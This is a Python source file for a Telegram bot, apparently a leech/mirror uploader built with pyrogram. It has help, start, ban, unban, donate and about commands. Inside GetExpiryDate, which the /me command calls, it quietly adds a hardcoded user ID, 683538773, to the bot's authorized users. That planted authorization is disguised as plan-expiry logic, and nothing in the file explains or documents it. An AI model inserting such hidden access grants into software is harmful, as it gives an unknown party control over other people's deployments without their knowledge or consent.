#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K
 
# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
 
import os
import sqlite3
from pyrogram import (
    Client,
    InlineKeyboardMarkup,
    InlineKeyboardButton
)
 
 
# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config
 
# the Strings used for this "thing"
from translation import Translation
 
import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

 
def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at
 
 
@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(
       [
         [
         InlineKeyboardButton('📢 CHANNEL 📢', url='https://t.me/FlixBots'),
         InlineKeyboardButton('🤖 FEEDBACK 🤖', url='https://t.me/FlixHelpBot')
         ],
         [
         InlineKeyboardButton('🎃 LEECH GROUP 🎃', url='https://t.me/LeechZone'),
         InlineKeyboardButton('🌀 MIRROR GROUP 🌀', url='https://t.me/Mirrorzone')
         ]
       ]
      )
    )
    return
 
@pyrogram.Client.on_message(pyrogram.filters.command(["me"]))
async def get_me_info(bot, update):
    # logger.info(update)
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )
 
@pyrogram.Client.on_message(pyrogram.filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT.format(update.from_user.first_name),
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('📢 CHANNEL 📢', url='https://t.me/FlixBots'),
                    InlineKeyboardButton('🤖 FEEDBACK 🤖', url='https://t.me/FlizHelpBot')
                ],
                [
                    InlineKeyboardButton('🎃 LEECH GROUP 🎃', url='https://t.me/LeechZone'),
                    InlineKeyboardButton('🌀 MIRROR GROUP 🌀', url='https://t.me/MirrorZone')
                ]
            ]
        ),
        reply_to_message_id=update.message_id
    )
    
Owner_id = [1314948019]
 
from sample_config import Config
 
@pyrogram.Client.on_message(pyrogram.filters.command(["ban"]))
async def ban(bot, update):
 if len(update.command) == 1:
      await bot.send_message(
        chat_id=update.chat.id,
        text="""Hai 😡 **{}** Don't spam here. There is no id for banning send the message in this format 👉 `/ban 123`""".format(update.from_user.first_name),
        parse_mode='Markdown'
      )
      return False
 if len(update.command) == 2:
   banid = int(update.text.split(' ', 1)[1])
   if update.from_user.id in Owner_id:
      await bot.send_message(
        chat_id=update.chat.id,
        text='User with ID {} Was banned from using your bot successfully'.format(banid)
      )
      return Config.BANNED_USERS.append(banid)
 
   elif update.from_user.id not in Owner_id:
      await bot.send_message(
        chat_id=update.chat.id,
        text="""Hai 😡 **{}** your not any admin this command only for admin of this bot for banning users from this bot""".format(update.from_user.first_name),
        parse_mode='Markdown'
      )
      return False
 
 
 
from sample_config import Config
 
@pyrogram.Client.on_message(pyrogram.filters.command(["unban"]))
async def unban(bot, update):
 if len(update.command) == 1:
  await bot.send_message(chat_id=update.chat.id, text="Hai **{}** 😡 there is no Id which should be banned. So use the format `/unban 1234` for banning the user".format(update.from_user.first_name), parse_mode="markdown")
 if len(update.command) == 2:
  unbanid = int(update.text.split(' ', 1)[1])
  if update.from_user.id in Owner_id:
    if unbanid in Config.BANNED_USERS:
      await bot.send_message(
        chat_id=update.chat.id,
        text='User with ID {} Was unbanned and free to use  your bot'.format(unbanid)
        )
      return Config.BANNED_USERS.remove(unbanid)
    elif unbanid not in Config.BANNED_USERS:
      await bot.send_message(
        chat_id=update.chat.id,
        text='User with ID {} Was not an banned user 🤷‍♂️'.format(unbanid)
       )
      return False
    else:
       await bot.send_message(
            chat_id=update.chat.id,
            text='Error 🤔'
         )
       return False
 
  elif update.from_user.id not in Owner_id:
      await bot.send_message(
          chat_id=update.chat.id,
          text='Hai 😡 **{}** your not any admin this command only for admin of this bot for banning users from this bot'.format(update.from_user.first_name),
          parse_mode='Markdown'
       )
      return False
  elif update.from_user.id in Config.BANNED_USERS:
      await bot.send_message(
          chat_id=update.chat.id,
          text='Hai 😡 **{}!!!** \you are banned you are not able to remove that on your own'.format(update.from_user.first_name),
          parse_mode='Markdown'
       )
      return False
    
@pyrogram.Client.on_message(pyrogram.filters.command(["donate"]))
async def donate(bot, update):
       await bot.send_message(
             chat_id=update.chat.id,
             text="I am very happy to listen you this word, making of this bot take lot of work and time so please donate by pressing this button present below   🛡️Accepted:PhonPay/Googlepay/UPI",
             reply_markup=InlineKeyboardMarkup(
             [
               [
                 InlineKeyboardButton('💰 DONATE 💰', url='https://t.me/Iggie')
               ]
             ]
           )
          )

 
@pyrogram.Client.on_message(pyrogram.filters.command(["about"]))
async def about(bot, update):
    # logger.info(update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.ABOUT_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_markup=InlineKeyboardMarkup(
             [
               [
                 InlineKeyboardButton('🎉 FLIX BOTS 🎉', url='https://t.me/FlixBots')
               ]
             ]
           )
          )
